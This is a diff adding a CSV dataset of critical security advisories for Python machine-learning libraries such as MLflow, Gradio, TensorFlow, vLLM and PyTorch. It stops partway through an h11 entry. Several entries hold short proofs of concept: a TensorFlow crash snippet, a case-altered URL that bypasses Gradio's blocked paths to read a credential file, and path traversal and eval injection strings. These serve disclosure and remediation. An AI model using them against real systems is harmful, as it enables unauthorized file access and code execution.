@@ -1,0 +1,882 @@
+,security_advisory.cve_id,security_advisory.cwes,security_advisory.severity,security_advisory.summary,security_advisory.description,counts
+0,CVE-2017-18342,['CWE-502'],critical,PyYAML insecurely deserializes YAML strings leading to arbitrary code execution,"In PyYAML before 5.1, the `yaml.load()` API could execute arbitrary code. In other words, `yaml.safe_load` is not used.
+
+This was intended to be fixed in 4.1, but due to [breaking changes](https://github.com/yaml/pyyaml/issues/192#issuecomment-401491470), 4.1 was yanked and 5.1 [contains](https://github.com/yaml/pyyaml/issues/207#issuecomment-472520007) the patch for CVE-2017-18342.",4
+1,CVE-2018-7575,['CWE-190'],critical,Integer Overflow or Wraparound in Google TensorFlow,"### Issue Description
+Google TensorFlow 1.7.x and earlier is affected by a Buffer Overflow vulnerability. The type of exploitation is context-dependent. The block size in meta file might contain a large int64 value which causes an integer overflow upon addition. Subsequent code using n as index may cause an out-of-bounds read.
+
+### Impact
+A maliciously crafted meta checkpoint could be used to cause the TensorFlow process to perform an out of bounds read on in process memory.
+",2
+2,CVE-2019-16224,['CWE-787'],critical,py-lmdb Invalid write operation,"An issue was discovered in py-lmdb 0.97. For certain values of `md_flags`, `mdb_node_add` does not properly set up a memcpy destination, leading to an invalid write operation. NOTE: this outcome occurs when accessing a `data.mdb` file supplied by an attacker.",2
+3,CVE-2019-16225,['CWE-787'],critical,py-lmdb Invalid write operation,"An issue was discovered in py-lmdb 0.97. For certain values of `mp_flags`, `mdb_page_touch `does not properly set up `mc->mc_pg[mc->top]`, leading to an invalid write operation. NOTE: this outcome occurs when accessing a `data.mdb` file supplied by an attacker.",2
+4,CVE-2019-16227,['CWE-787'],critical,py-lmdb Invalid write operation,"An issue was discovered in py-lmdb 0.97. For certain values of `mn_flags`, `mdb_cursor_set` triggers a memcpy with an invalid write operation within `mdb_xcursor_init1`. NOTE: this outcome occurs when accessing a `data.mdb` file supplied by an attacker.",2
+5,CVE-2019-6446,['CWE-502'],critical,Numpy Deserialization of Untrusted Data,"** DISPUTED **  An issue was discovered in NumPy 1.16.2 and earlier. It uses the pickle Python module unsafely, which allows remote attackers to execute arbitrary code via a crafted serialized object, as demonstrated by a numpy.load call. NOTE: third parties dispute this issue because it is  a behavior that might have legitimate applications in (for example) loading serialized Python object arrays from trusted and authenticated sources.",11
+6,CVE-2019-7164,['CWE-89'],critical,SQLAlchemy vulnerable to SQL Injection via order_by parameter,SQLAlchemy before 1.3.0b3 allows SQL Injection via the order_by parameter. The fix (commit 30307c4) was applied only to the main branch and was never backported to the 1.2.x release line; all 1.2.x versions remain vulnerable.,1
+7,CVE-2019-7548,['CWE-89'],critical,SQLAlchemy is vulnerable to SQL Injection via group_by parameter ,SQLAlchemy 1.2.17 has SQL Injection when the group_by parameter can be controlled.,1
+8,CVE-2020-11538,['CWE-125'],critical,Out-of-bounds read in Pillow,"In libImaging/SgiRleDecode.c in Pillow through 7.0.0, a number of out-of-bounds reads exist in the parsing of SGI image files, a different issue than CVE-2020-5311.",1
+9,CVE-2020-13092,['CWE-502'],critical,scikit-learn Deserialization of Untrusted Data,"scikit-learn (aka sklearn) through 0.23.0 can unserialize and execute commands from an untrusted file that is passed to the `joblib.load()` function, if `__reduce__` makes an `os.system call`.
+NOTE: third parties dispute this issue because the joblib.load() function is documented as unsafe and it is the user's responsibility to use the function in a secure manner.",13
+10,CVE-2020-14343,['CWE-20'],critical,Improper Input Validation in PyYAML,"A vulnerability was discovered in the PyYAML library in versions before 5.4, where it is susceptible to arbitrary code execution when it processes untrusted YAML files through the full_load method or with the FullLoader loader. Applications that use the library to process untrusted input may be vulnerable to this flaw. This flaw allows an attacker to execute arbitrary code on the system by abusing the python/object/new constructor. This flaw is due to an incomplete fix for CVE-2020-1747.",7
+11,CVE-2020-15212,['CWE-787'],critical,Out of bounds access in tensorflow-lite,"### Impact
+In TensorFlow Lite models using segment sum can trigger writes outside of bounds of heap allocated buffers by inserting negative elements in the segment ids tensor:
+https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/internal/reference/reference_ops.h#L2625-L2631
+
+Users having access to `segment_ids_data` can alter `output_index` and then write to outside of `output_data` buffer.
+
+This might result in a segmentation fault but it can also be used to further corrupt the memory and can be chained with other vulnerabilities to create more advanced exploits.
+
+### Patches
+We have patched the issue in 204945b and will release patch releases for all affected versions.
+
+We recommend users to upgrade to TensorFlow 2.2.1, or 2.3.1.
+
+### Workarounds
+A potential workaround would be to add a custom `Verifier` to the model loading code to ensure that the segment ids are all positive, although this only handles the case when the segment ids are stored statically in the model.
+
+A similar validation could be done if the segment ids are generated at runtime between inference steps.
+
+If the segment ids are generated as outputs of a tensor during inference steps, then there are no possible workaround and users are advised to upgrade to patched code.
+
+### For more information
+Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
+
+### Attribution
+This vulnerability has been discovered from a variant analysis of [GHSA-p2cq-cprg-frvm](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2cq-cprg-frvm).",1
+12,CVE-2020-15214,['CWE-787'],critical,Out of bounds write in tensorflow-lite,"### Impact
+In TensorFlow Lite models using segment sum can trigger a write out bounds / segmentation fault if the segment ids are not sorted. Code assumes that the segment ids are in increasing order, using the last element of the tensor holding them to determine the dimensionality of output tensor:
+https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/segment_sum.cc#L39-L44
+
+This results in allocating insufficient memory for the output tensor and in a write outside the bounds of the output array:
+https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/internal/reference/reference_ops.h#L2625-L2631
+
+This usually results in a segmentation fault, but depending on runtime conditions it can provide for a write gadget to be used in future memory corruption-based exploits.
+
+### Patches
+We have patched the issue in 204945b and will release patch releases for all affected versions.
+
+We recommend users to upgrade to TensorFlow 2.2.1, or 2.3.1.
+
+### Workarounds
+A potential workaround would be to add a custom `Verifier` to the model loading code to ensure that the segment ids are sorted, although this only handles the case when the segment ids are stored statically in the model.
+
+A similar validation could be done if the segment ids are generated at runtime between inference steps.
+
+If the segment ids are generated as outputs of a tensor during inference steps, then there are no possible workaround and users are advised to upgrade to patched code.
+
+### For more information
+Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
+
+### Attribution
+This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",1
+13,CVE-2021-25289,['CWE-787'],critical,Out of bounds write in Pillow,An issue was discovered in Pillow before 8.1.1. TiffDecode has a heap-based buffer overflow when decoding crafted YCbCr files because of certain interpretation conflicts with LibTIFF in RGBA mode. NOTE: this issue exists because of an incomplete fix for CVE-2020-35654.,4
+14,CVE-2021-34552,['CWE-120'],critical,Buffer Overflow in Pillow,Pillow through 8.2.0 and PIL (aka Python Imaging Library) through 1.1.7 allow an attacker to pass controlled parameters directly into a convert function to trigger a buffer overflow in Convert.c.,4
+15,CVE-2021-41208,"['CWE-476', 'CWE-824']",critical,Incomplete validation in boosted trees code,"### Impact
+The [code for boosted trees in TensorFlow](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/boosted_trees/stats_ops.cc) is still missing validation. As a result, attackers can trigger denial of service (via dereferencing `nullptr`s or via `CHECK`-failures) as well as abuse undefined behavior (binding references to `nullptr`s). An attacker can also read and write from heap buffers, depending on the API that gets used and the arguments that are passed to the call.
+
+**Note**: Given that the boosted trees implementation in TensorFlow is unmaintained, it is recommend to no longer use these APIs.  Instead, please use the downstream [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests) project which is newer and supports more features. We will deprecate TensorFlow's boosted trees APIs in subsequent releases.
+
+### Patches
+We have patched the issue in GitHub commit [5c8c9a8bfe750f9743d0c859bae112060b216f5c](https://github.com/tensorflow/tensorflow/commit/5c8c9a8bfe750f9743d0c859bae112060b216f5c).
+
+The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.
+
+### For more information
+Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
+
+### Attribution
+This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",10
+16,CVE-2022-21797,['CWE-94'],critical,joblib vulnerable to arbitrary code execution,The package joblib from 0 and before 1.2.0 is vulnerable to Arbitrary Code Execution via the `pre_dispatch` flag in `Parallel()` class due to the `eval()` statement.,4
+17,CVE-2022-22817,['CWE-74'],critical,Arbitrary expression injection in Pillow,"`PIL.ImageMath.eval` in Pillow before 9.0.0 allows evaluation of arbitrary expressions, such as ones that use the Python exec method `ImageMath.eval(""exec(exit())"")`.
+
+While Pillow 9.0.0 restricted top-level builtins available to PIL.ImageMath.eval(), it did not prevent builtins available to lambda expressions. These are now also restricted in 9.0.1.",6
+18,CVE-2022-24439,"['CWE-20', 'CWE-94']",critical,GitPython vulnerable to Remote Code Execution due to improper user input validation,"All versions of package gitpython are vulnerable to Remote Code Execution (RCE) due to improper user input validation, which makes it possible to inject a maliciously crafted remote URL into the clone command. Exploiting this vulnerability is possible because the library makes external calls to git without sufficient sanitization of input arguments.",1
+19,CVE-2022-45907,['CWE-77'],critical,PyTorch vulnerable to arbitrary code execution,"In PyTorch before trunk/89695, torch.jit.annotations.parse_type_line can cause arbitrary code execution because eval is used unsafely. The fix for this issue is available in version 1.13.1. There is a release checker in [issue #89855](https://github.com/pytorch/pytorch/issues/89855).",21
+20,CVE-2023-25668,"['CWE-122', 'CWE-125']",critical,TensorFlow has a heap out-of-buffer read vulnerability in the QuantizeAndDequantize operation,"### Impact
+Attackers using Tensorflow can exploit the vulnerability. They can access heap memory which is not in the control of user, leading to a crash or RCE.
+When axis is larger than the dim of input, c->Dim(input,axis) goes out of bound.
+Same problem occurs in the QuantizeAndDequantizeV2/V3/V4/V4Grad operations too.
+```python
+import tensorflow as tf
+@tf.function
+def test():
+    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],
+    								   input_min=[1.0],
+    								   input_max=[10.0],
+    								   signed_input=True,
+    								   num_bits=1,
+    								   range_given=True,
+    								   round_mode='HALF_TO_EVEN',
+    								   narrow_range=True,
+    								   axis=0x7fffffff)
+test()
+```
+
+
+
+### Patches
+We have patched the issue in GitHub commit [7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb](https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb).
+
+The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1
+
+
+### For more information
+Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
+
+
+",11
+21,CVE-2023-39631,['CWE-94'],critical,Langchain vulnerable to arbitrary code execution via the evaluate function in the numexpr library,"An issue in LanChain-ai Langchain v.0.0.245 allows a remote attacker to execute arbitrary code via the evaluate function in the numexpr library.
+
+Patches: Released in v.0.0.308. numexpr dependency is optional for langchain.",1
+22,CVE-2023-40267,['CWE-78'],critical,GitPython vulnerable to remote code execution due to insufficient sanitization of input arguments,"GitPython before 3.1.32 does not block insecure non-multi options in `clone` and `clone_from`, making it vulnerable to Remote Code Execution (RCE) due to improper user input validation, which makes it possible to inject a maliciously crafted remote URL into the clone command. Exploiting this vulnerability is possible because the library makes external calls to git without sufficient sanitization of input arguments. NOTE: this issue exists because of an incomplete fix for CVE-2022-24439.",1
+23,CVE-2023-41419,[],critical,Gevent allows remote attacker to escalate privileges,An issue in Gevent before version 23.9.0 allows a remote attacker to escalate privileges via a crafted script to the WSGIServer component.,1
+24,CVE-2023-47248,['CWE-502'],critical,PyArrow: Arbitrary code execution when loading a malicious data file,"Deserialization of untrusted data in IPC and Parquet readers in PyArrow versions 0.14.0 to 14.0.0 allows arbitrary code execution. An application is vulnerable if it reads Arrow IPC, Feather or Parquet data from untrusted sources (for example user-supplied input files).
+
+This vulnerability only affects PyArrow, not other Apache Arrow implementations or bindings.
+
+It is recommended that users of PyArrow upgrade to 14.0.1. Similarly, it is recommended that downstream libraries upgrade their dependency requirements to PyArrow 14.0.1 or later. PyPI packages are already available, and we hope that conda-forge packages will be available soon.
+
+If it is not possible to upgrade, maintainers provide a separate package `pyarrow-hotfix` that disables the vulnerability on older PyArrow versions. See https://pypi.org/project/pyarrow-hotfix/  for instructions.",2
+25,CVE-2023-48022,"['CWE-829', 'CWE-918']",critical,Ray has arbitrary code execution via jobs submission API,"Anyscale Ray allows a remote attacker to execute arbitrary code via the job submission API. NOTE: the vendor's position is that this report is irrelevant because Ray, as stated in its documentation, is not intended for use outside of a strictly controlled network environment.",1
+26,CVE-2023-50447,"['CWE-94', 'CWE-95']",critical,Arbitrary Code Execution in Pillow,"Pillow through 10.1.0 allows PIL.ImageMath.eval Arbitrary Code Execution via the environment parameter, a different vulnerability than CVE-2022-22817 (which was about the expression parameter).",8
+27,CVE-2023-6014,['CWE-598'],critical,MLflow authentication requirement bypass can allow a user to arbitrarily create an account,An attacker is able to arbitrarily create an account in MLflow bypassing any authentication requirement.,1
+28,CVE-2023-6015,['CWE-22'],critical,MLflow allowed arbitrary files to be PUT onto the server,MLflow allowed arbitrary files to be PUT onto the server.,1
+29,CVE-2023-6018,['CWE-78'],critical,Remote Code Execution due to Full Controled File Write in mlflow,"The mlflow web server includes tools for tracking experiments, packaging code into reproducible runs, and sharing and deploying models. As this vulnerability allows to write / overwrite any file on the file system, it gives a lot of ways to archive code execution (like overwriting `/home/<user>/.bashrc`). A malicious user could use this issue to get command execution on the vulnerable machine and get access to data & models information.",2
+30,CVE-2023-6572,"['CWE-77', 'CWE-200']",critical,Gradio Exposure of Sensitive Information to an Unauthorized Actor vulnerability,Exposure of Sensitive Information to an Unauthorized Actor in GitHub repository gradio-app/gradio prior to main.,2
+31,CVE-2023-6730,['CWE-502'],critical,transformers has a Deserialization of Untrusted Data vulnerability,Deserialization of Untrusted Data in GitHub repository huggingface/transformers prior to 4.36.0.,15
+32,CVE-2023-6831,"['CWE-22', 'CWE-29']",critical,Path traversal in MLflow,Path Traversal: '\..\filename' in GitHub repository mlflow/mlflow prior to 2.9.2.,2
+33,CVE-2023-6974,['CWE-918'],critical,MLflow Server-Side Request Forgery (SSRF),A malicious user could use this issue to access internal HTTP(s) servers and in the worst case (ie: aws instance) it could be abused to get a remote code execution on the victim machine.,2
+34,CVE-2023-6975,['CWE-29'],critical,MLFlow Path Traversal Vulnerability,A malicious user could use this issue to get command execution on the vulnerable machine and get access to data & models information.,2
+35,CVE-2024-0520,"['CWE-22', 'CWE-23']",critical,Remote code execution in mlflow,"A vulnerability in mlflow/mlflow version 8.2.1 allows for remote code execution due to improper neutralization of special elements used in an OS command ('Command Injection') within the `mlflow.data.http_dataset_source.py` module. Specifically, when loading a dataset from a source URL with an HTTP scheme, the filename extracted from the `Content-Disposition` header or the URL path is used to generate the final file path without proper sanitization. This flaw enables an attacker to control the file path fully by utilizing path traversal or absolute path techniques, such as '../../tmp/poc.txt' or '/tmp/poc.txt', leading to arbitrary file write. Exploiting this vulnerability could allow a malicious user to execute commands on the vulnerable machine, potentially gaining access to data and model information. The issue is fixed in version 2.9.0.",2
+36,CVE-2024-11041,['CWE-502'],critical,vLLM Deserialization of Untrusted Data vulnerability,"vllm-project vllm version v0.6.2 contains a vulnerability in the MessageQueue.dequeue() API function. The function uses pickle.loads to parse received sockets directly, leading to a remote code execution vulnerability. An attacker can exploit this by sending a malicious payload to the MessageQueue, causing the victim's machine to execute arbitrary code.",1
+37,CVE-2024-1728,['CWE-22'],critical,Gradio allows users to access arbitrary files,"### Impact
+This vulnerability allows users of Gradio applications that have a public link (such as on Hugging Face Spaces) to access files on the machine hosting the Gradio application. This involves intercepting and modifying the network requests made by the Gradio app to the server. 
+
+### Patches
+Yes, the problem has been patched in Gradio version 4.19.2 or higher. We have no knowledge of this exploit being used against users of Gradio applications, but we encourage all users to upgrade to Gradio 4.19.2 or higher.
+
+Fixed in: https://github.com/gradio-app/gradio/commit/16fbe9cd0cffa9f2a824a0165beb43446114eec7
+CVE: https://nvd.nist.gov/vuln/detail/CVE-2024-1728",2
+38,CVE-2024-2195,['CWE-94'],critical,Aim Web API vulnerable to Remote Code Execution,"A critical Remote Code Execution (RCE) vulnerability was identified in the aimhubio/aim project, specifically within the `/api/runs/search/run/` endpoint, affecting versions >= 3.0.0. The vulnerability resides in the `run_search_api` function of the `aim/web/api/runs/views.py` file, where improper restriction of user access to the `RunView` object allows for the execution of arbitrary code via the `query` parameter. This issue enables attackers to execute arbitrary commands on the server, potentially leading to full system compromise.",5
+39,CVE-2024-27132,['CWE-79'],critical,Cross-site Scripting in MLFlow,"Insufficient sanitization in MLflow leads to XSS when running an untrusted recipe.
+
+This issue leads to a client-side RCE when running an untrusted recipe in Jupyter Notebook.
+
+The vulnerability stems from lack of sanitization over template variables.",2
+40,CVE-2024-27133,['CWE-79'],critical,MLFlow Cross-site Scripting vulnerability leads to client-side Remote Code Execution,Insufficient sanitization in MLflow leads to XSS when running a recipe that uses an untrusted dataset. This issue leads to a client-side RCE when running the recipe in Jupyter Notebook. The vulnerability stems from lack of sanitization over dataset table fields.,2
+41,CVE-2024-27444,['CWE-749'],critical,LangChain Experimental vulnerable to arbitrary code execution,"langchain_experimental (aka LangChain Experimental) before 0.0.52, part of LangChain before 0.1.8, allows an attacker to bypass the CVE-2023-44467 fix and execute arbitrary code via the `__import__`, `__subclasses__`, `__builtins__`, `__globals__`, `__getattribute__`, `__bases__`, `__mro__`, or `__base__` attribute in Python code. These are not prohibited by `pal_chain/base.py`.",1
+42,CVE-2024-3573,['CWE-29'],critical,mlflow vulnerable to Path Traversal,"mlflow/mlflow is vulnerable to Local File Inclusion (LFI) due to improper parsing of URIs, allowing attackers to bypass checks and read arbitrary files on the system. The issue arises from the 'is_local_uri' function's failure to properly handle URIs with empty or 'file' schemes, leading to the misclassification of URIs as non-local. Attackers can exploit this by crafting malicious model versions with specially crafted 'source' parameters, enabling the reading of sensitive files within at least two directory levels from the server's root.",2
+43,CVE-2024-36039,['CWE-89'],critical,PyMySQL SQL Injection vulnerability,PyMySQL through 1.1.0 allows SQL injection if used with untrusted JSON input because keys are not escaped by `escape_dict`.,1
+44,CVE-2024-3660,['CWE-94'],critical,Keras code injection vulnerability,A arbitrary code injection vulnerability in TensorFlow's Keras framework (<2.13) allows attackers to execute arbitrary code with the same permissions as the application using a model that allow arbitrary code irrespective of the application.,4
+45,CVE-2024-45758,['CWE-502'],critical,H2O.ai H2O vulnerable to deserialization attacks via a JDBC Connection URL,"H2O.ai H2O through 3.46.0.4 allows attackers to arbitrarily set the JDBC URL, leading to deserialization attacks, file reads, and command execution. Exploitation can occur when an attacker has access to post to the ImportSQLTable URI with a JSON document containing a connection_url property with any typical JDBC Connection URL attack payload such as one that uses queryInterceptors.",1
+46,CVE-2024-5452,"['CWE-913', 'CWE-915']",critical,Remote code execution in pytorch lightning,"A remote code execution (RCE) vulnerability exists in the lightning-ai/pytorch-lightning library version 2.2.1 due to improper handling of deserialized user input and mismanagement of dunder attributes by the `deepdiff` library. The library uses `deepdiff.Delta` objects to modify application state based on frontend actions. However, it is possible to bypass the intended restrictions on modifying dunder attributes, allowing an attacker to construct a serialized delta that passes the deserializer whitelist and contains dunder attributes. When processed, this can be exploited to access other modules, classes, and instances, leading to arbitrary attribute write and total RCE on any self-hosted pytorch-lightning application in its default configuration, as the delta endpoint is enabled by default.",1
+47,CVE-2024-5980,"['CWE-22', 'CWE-434']",critical,pytorch-lightning vulnerable to Arbitrary File Write via /v1/runs API endpoint,"A vulnerability in the /v1/runs API endpoint of lightning-ai/pytorch-lightning v2.2.4 allows attackers to exploit path traversal when extracting tar.gz files. When the LightningApp is running with the plugin_server, attackers can deploy malicious tar.gz plugins that embed arbitrary files with path traversal vulnerabilities. This can result in arbitrary files being written to any directory in the victim's local file system, potentially leading to remote code execution.",1
+48,CVE-2024-8019,['CWE-434'],critical,PyTorch Lightning path traversal vulnerability,"In lightning-ai/pytorch-lightning version 2.3.2, a vulnerability exists in the `LightningApp` when running on a Windows host. The vulnerability occurs at the `/api/v1/upload_file/` endpoint, allowing an attacker to write or overwrite arbitrary files by providing a crafted filename. This can lead to potential remote code execution (RCE) by overwriting critical files or placing malicious files in sensitive locations.",2
+49,CVE-2024-8769,"['CWE-22', 'CWE-29']",critical,Aim  path traversal in LockManager.release_locks,"A vulnerability in the `LockManager.release_locks` function in aimhubio/aim (commit bb76afe) allows for arbitrary file deletion through relative path traversal. The `run_hash` parameter, which is user-controllable, is concatenated without normalization as part of a path used to specify file deletion. This vulnerability is exposed through the `Repo._close_run()` method, which is accessible via the tracking server instruction API. As a result, an attacker can exploit this to delete any arbitrary file on the machine running the tracking server.",5
+50,CVE-2024-9052,['CWE-502'],critical,vLLM deserialization vulnerability in vllm.distributed.GroupCoordinator.recv_object,"vllm-project vllm version 0.6.0 contains a vulnerability in the distributed training API. The function vllm.distributed.GroupCoordinator.recv_object() deserializes received object bytes using pickle.loads() without sanitization, leading to a remote code execution vulnerability.
+
+### Maintainer perspective
+Note that vLLM does NOT use the code as described in the report on huntr. The problem only exists if you use these internal APIs in a way that exposes them to a network as described. The vllm team was not involved in the analysis of this report and the decision to assign it a CVE.",1
+51,CVE-2024-9053,"['CWE-78', 'CWE-502']",critical,vLLM allows Remote Code Execution by Pickle Deserialization via AsyncEngineRPCServer() RPC server entrypoints,"vllm-project vllm version 0.6.0 contains a vulnerability in the AsyncEngineRPCServer() RPC server entrypoints. The core functionality run_server_loop() calls the function _make_handler_coro(), which directly uses cloudpickle.loads() on received messages without any sanitization. This can result in remote code execution by deserializing malicious pickle data.",1
+52,CVE-2025-14009,['CWE-94'],critical,NLTK has a Zip Slip Vulnerability,"A critical vulnerability exists in the NLTK downloader component of nltk/nltk, affecting all versions. The _unzip_iter function in nltk/downloader.py uses zipfile.extractall() without performing path validation or security checks. This allows attackers to craft malicious zip packages that, when downloaded and extracted by NLTK, can execute arbitrary code. The vulnerability arises because NLTK assumes all downloaded packages are trusted and extracts them without validation. If a malicious package contains Python files, such as __init__.py, these files are executed automatically upon import, leading to remote code execution. This issue can result in full system compromise, including file system access, network access, and potential persistence mechanisms.",8
+53,CVE-2025-15036,['CWE-29'],critical,MLFlow path traversal vulnerability,"A path traversal vulnerability exists in the `extract_archive_to_dir` function within the `mlflow/pyfunc/dbconnect_artifact_cache.py` file of the mlflow/mlflow repository. This vulnerability, present in versions before v3.7.0, arises due to the lack of validation of tar member paths during extraction. An attacker with control over the tar.gz file can exploit this issue to overwrite arbitrary files or gain elevated privileges, potentially escaping the sandbox directory in multi-tenant or shared cluster environments.",7
+54,CVE-2025-15379,['CWE-77'],critical,MLflow Command Injection vulnerability,"A command injection vulnerability exists in MLflow's model serving container initialization code, specifically in the `_install_model_dependencies_to_env()` function. When deploying a model with `env_manager=LOCAL`, MLflow reads dependency specifications from the model artifact's `python_env.yaml` file and directly interpolates them into a shell command without sanitization. This allows an attacker to supply a malicious model artifact and achieve arbitrary command execution on systems that deploy the model. The vulnerability affects versions 3.8.0 and is fixed in version 3.8.1.",7
+55,CVE-2025-1793,['CWE-89'],critical,llama_index vulnerable to SQL Injection,"Multiple vector store integrations in run-llama/llama_index version v0.12.21 have SQL injection vulnerabilities. These vulnerabilities allow an attacker to read and write data using SQL, potentially leading to unauthorized access to data of other users depending on the usage of the llama-index library in a web application.",1
+56,CVE-2025-23042,"['CWE-178', 'CWE-285']",critical,Gradio Blocked Path ACL Bypass Vulnerability,"## Summary
+
+Gradio's Access Control List (ACL) for file paths can be bypassed by altering the letter case of a blocked file or directory path. This vulnerability arises due to the lack of case normalization in the file path validation logic. On case-insensitive file systems, such as those used by Windows and macOS, this flaw enables attackers to circumvent security restrictions and access sensitive files that should be protected.
+
+This issue can lead to unauthorized data access, exposing sensitive information and undermining the integrity of Gradio's security model. Given Gradio's popularity for building web applications, particularly in machine learning and AI, this vulnerability may pose a substantial threat if exploited in production environments.
+
+## Affected Version
+
+Gradio <= 5.6.0
+
+## Impact
+
+- **Unauthorized Access**: Sensitive files or directories specified in `blocked_paths` can be accessed by attackers.
+
+- **Data Exposure**: Critical files, such as configuration files or user data, may be leaked.
+
+- **Security Breach**: This can lead to broader application or system compromise if sensitive files contain credentials or API keys.
+
+## Root Cause
+
+The [`blocked_paths`](https://github.com/gradio-app/gradio/blob/main/gradio/blocks.py#L2310) parameter in Gradio block's initial configuration is designed to restrict user access to specific files or directories in the local file system. However, it does not account for case-insensitive operating systems, such as Windows and macOS. This oversight enables attackers to bypass ACL restrictions by changing the case of file paths.
+
+Vulnerable snippet: 
+
+```python
+# https://github.com/gradio-app/gradio/blob/main/gradio/utils.py#L1500-L1517
+def is_allowed_file(
+    path: Path,
+    blocked_paths: Sequence[str | Path],
+    allowed_paths: Sequence[str | Path],
+    created_paths: Sequence[str | Path],
+) -> tuple[
+    bool, Literal[""in_blocklist"", ""allowed"", ""created"", ""not_created_or_allowed""]
+]:
+    in_blocklist = any(
+        is_in_or_equal(path, blocked_path) for blocked_path in blocked_paths
+    )
+    if in_blocklist:
+        return False, ""in_blocklist""
+    if any(is_in_or_equal(path, allowed_path) for allowed_path in allowed_paths):
+        return True, ""allowed""
+    if any(is_in_or_equal(path, created_path) for created_path in created_paths):
+        return True, ""created""
+    return False, ""not_created_or_allowed""
+```
+
+Gradio relies on `is_in_or_equal` to determine if a file path is restricted. However, this logic fails to handle case variations in paths on case-insensitive file systems, leading to the bypass.
+
+## Proof of Concept (PoC)
+
+### Steps to Reproduce
+
+- Deploy a Gradio demo app on a case-insensitive operating system (e.g., Windows or macOS).
+
+  ```bash
+  import gradio as gr
+  def update(name):
+      return f""Welcome to Gradio, {name}!""
+  
+  with gr.Blocks() as demo:
+      gr.Markdown(""Start typing below and then click **Run** to see the output."")
+      with gr.Row():
+          inp = gr.Textbox(placeholder=""What is your name?"")
+          out = gr.Textbox()
+      btn = gr.Button(""Run"")
+      btn.click(fn=update, inputs=inp, outputs=out)
+  
+  demo.launch(blocked_paths=['resources/admin'], allowed_paths=['resources/'])
+  ```
+
+- Set up the file system:
+
+  - Create a folder named `resources` in the same directory as the app, containing a file `1.txt`.
+
+  - Inside the `resources` folder, create a subfolder named `admin` containing a sensitive file `credential.txt` (this file should be inaccessible due to `blocked_paths`).
+
+- Perform the attack:
+
+  - Access the sensitive file using a case-altered path:
+
+    ```
+    http://127.0.0.1:PORT/gradio_api/file=resources/adMin/credential.txt
+    ```
+
+### Expected Result
+
+Access to `resources/admin/credential.txt` should be blocked.
+
+### Actual Result
+
+By altering the case in the path (e.g., `adMin`), the blocked ACL is bypassed, and unauthorized access to the sensitive file is granted.
+
+![image-20241119172439042](https://api.2h0ng.wiki:443/noteimages/2024/11/19/17-24-39-883969d4c31ce8a8d2a939654fab56d4.png)
+
+This demonstration highlights that flipping the case of restricted paths allows attackers to bypass Gradio's ACL and access sensitive data.
+
+## Remediation Recommendations
+
+1. **Normalize Path Case**:
+
+   - Before evaluating paths against the ACL, normalize the case of both the requested path and the blocked paths (e.g., convert all paths to lowercase).
+
+   - Example:
+
+     ```python
+     normalized_path = str(path).lower()
+     normalized_blocked_paths = [str(p).lower() for p in blocked_paths]
+     ```
+
+2. **Update Documentation**:
+
+   - Warn developers about potential risks when deploying Gradio on case-insensitive file systems.
+
+3. **Release Security Patches**:
+
+   - Notify users of the vulnerability and release an updated version of Gradio with the fixed logic.
+
+##",2
+57,CVE-2025-32434,['CWE-502'],critical,PyTorch: `torch.load` with `weights_only=True` leads to remote code execution,"# Description
+I found a Remote Command Execution (RCE) vulnerability in PyTorch. When loading model using torch.load with weights_only=True, it can still achieve RCE.  
+
+# Background knowledge
+https://github.com/pytorch/pytorch/security 
+ As you can see, the PyTorch official documentation considers using `torch.load()` with `weights_only=True` to be safe.
+![image](https://github.com/user-attachments/assets/fdaa8520-d66a-473a-ab1f-163d793de298)
+Since everyone knows that weights_only=False is unsafe, so they will use the  weights_only=True to mitigate the seucirty issue.
+But now, I just proved that even if you use weights_only=True, it can still achieve RCE.
+
+# Credit
+This vulnerability was found by Ji'an Zhou.",41
+58,CVE-2025-34351,"['CWE-304', 'CWE-1188']",critical,Ray's New Token Authentication is Disabled By Default,"Anyscale Ray 2.52.0 contains an insecure default configuration in which token-based authentication for Ray management interfaces (including the dashboard and Jobs API) is disabled unless explicitly enabled by setting RAY_AUTH_MODE=token. In the default unauthenticated state, a remote attacker with network access to these interfaces can submit jobs and execute arbitrary code on the Ray cluster. NOTE: The vendor plans to enable token authentication by default in a future release. They recommend enabling token authentication to protect your cluster from unauthorized access.",1
+59,CVE-2025-43859,['CWE-444'],critical,h11 accepts some malformed Chunked-Encoding bodies,"### Impact
+
+A leniency in h11's parsing of line terminators in chunked-coding message bodies can lead to request smuggling vulnerabilities under certain conditions.
+
+### Details
+
+HTTP/1.1 Chunked-Encoding bodies are formatted as a sequence of ""chunks"", each of which consists of:
+
+- chunk length
+- `\r\n`
+- `length` bytes of content
+- `\r\n`
+
+In versions of h11 up to 0.14.0, h11 instead parsed them as:
+
+- chunk length
+- `\r\n`
+- `length` bytes of content
+- any two bytes
+
+i.e. it did not validate that the trailing `\r\n` bytes were correct, and if you put 2 bytes of garbage there it would be accepted, instead of correctly rejecting the body as malformed.
+
+By itself this is harmless. However, suppose you have a proxy or reverse-proxy that tries to analyze HTTP requests, and your proxy has a _different_ bug in parsing Chunked-Encoding, acting as if the format is:
+
+- chunk length
